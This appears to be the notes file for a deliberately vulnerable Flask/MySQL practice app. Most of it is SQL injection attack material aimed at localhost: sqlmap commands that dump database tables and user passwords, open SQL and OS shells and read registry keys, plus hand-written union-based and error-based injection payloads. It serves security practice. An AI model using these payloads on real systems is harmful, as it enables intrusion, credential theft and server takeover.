# sqlivulntestapp
# -- Setup
pip install virtualenv

mkdir myproject
cd myproject
virtualenv venv

pip install flask
pip install flask-restful
pip install flask-mysql


venv\Scripts\activate
deactivate

# ------------------

#http://codehandbook.org/flask-restful-api-using-python-mysql/
## https://hackingvision.com/2017/04/14/sqlmap-tutorial-sql-injection-hack-website-database-kali-linux/
## http://niiconsulting.com/checkmate/2014/01/from-sql-injection-to-0wnage-using-sqlmap/
## http://amolnaik4.blogspot.ca/2012/05/sqlmap-operating-system-takeover.html
## http://kaoticcreations.blogspot.ca/2011/05/owning-database-with-sqlmap-and.html

## tutorial
### https://renouncedthoughts.wordpress.com/2014/01/14/devouring-security-sql-injection-exploitation-and-prevention-part-1/
### https://renouncedthoughts.wordpress.com/2014/02/07/devouring-security-sql-injection-exploitation-and-prevention-part-2/

## browser
### https://www.darknet.org.uk/2011/01/mantra-security-toolkit-free-open-source-browser-based-security-framework/
### use PostMan to send post params
------------------

python sqlmap.py --url="http://127.0.0.1:5000/GetAllItems?id=1"
python sqlmap.py --url="http://127.0.0.1:5000/GetAllItems?id=1" --dbs
python sqlmap.py --url="http://127.0.0.1:5000/GetAllItems?id=1" -D itemlistdb --tables
python sqlmap.py --url="http://127.0.0.1:5000/GetAllItems?id=1" -D itemlistdb -T tbluser --columns
python sqlmap.py --url="http://127.0.0.1:5000/GetAllItems?id=1" -D itemlistdb -T tbluser -C userId,userName,password --dump
python sqlmap.py --url="http://127.0.0.1:5000/GetAllItems?id=1" -D information_schema --tables
python sqlmap.py --url="http://127.0.0.1:5000/GetAllItems?id=1" -D information_schema -T USER_PRIVILEGES --dump
# sql shell
python sqlmap.py --url="http://127.0.0.1:5000/GetAllItems?id=1" -D information_schema --sql-shell

####
http://127.0.0.1:5000/GetAllItems?id=1'
# comment
http://127.0.0.1:5000/GetAllItems?id=1'--+
# true
http://127.0.0.1:5000/GetAllItems?id=1' and '1'='1'--+
# false
http://127.0.0.1:5000/GetAllItems?id=1' and '1'='0'--+
# number of columns
http://127.0.0.1:5000/GetAllItems?id=1' order by 3--+

## SQLI U 
# union statement
http://127.0.0.1:5000/GetAllItems?id=1' union all select 1,'2'--+
# database name
http://127.0.0.1:5000/GetAllItems?id=1' union all select 1,database()--+
# db version
http://127.0.0.1:5000/GetAllItems?id=1' union all select 1,version()--+
# user
http://127.0.0.1:5000/GetAllItems?id=1' union all select 1,user()--+
# temp dir
http://127.0.0.1:5000/GetAllItems?id=1' union all select 1,@@tmpdir--+
## data extraction
# tables in schema
http://127.0.0.1:5000/GetAllItems?id=1' union all select 1,table_name from information_schema.tables where table_schema=database()--+
# columns in table
http://127.0.0.1:5000/GetAllItems?id=1' union all select 1,column_name from information_schema.columns where table_schema=database() and table_name='tblUser'--+
# extract values
http://127.0.0.1:5000/GetAllItems?id=1' union all select 1,concat(userName, '-', password) from tblUser--+

## SQLI E - guessing
POST on http://127.0.0.1:5000/AddItem

# statement closure
other stuff')#
# run correct statement
other stuff'); select table_name from information_schema.tables#

# make the server give answer via error messaging
# http://hacksafe.blogspot.ca/2010/10/quick-dirty-mysql-error-based-blind.html
# hex value of database use in python "hex_value".decode("hex") 
other stuff'); select 1 from(select count(*),concat((select (select concat(0x7e,0x27,Hex(cast(database() as char)),0x27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a#

# os shell
python sqlmap.py --url="http://127.0.0.1:5000/GetAllItems?id=1" --technique=S --os-shell
python sqlmap.py --url="http://127.0.0.1:5000/GetAllItems?id=1" --os-cmd=hostname
python sqlmap.py --url="http://127.0.0.1:5000/GetAllItems?id=1" --sql-query "SELECT @@datadir
python sqlmap.py --url="http://127.0.0.1:5000/GetAllItems?id=1" --time-sec 50 --no-cast --reg-read --reg-key="HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" --reg-value=fDenyTSConnections

python sqlmap.py --url="http://127.0.0.1:5000/GetAllItems?id=1" --os-pwn
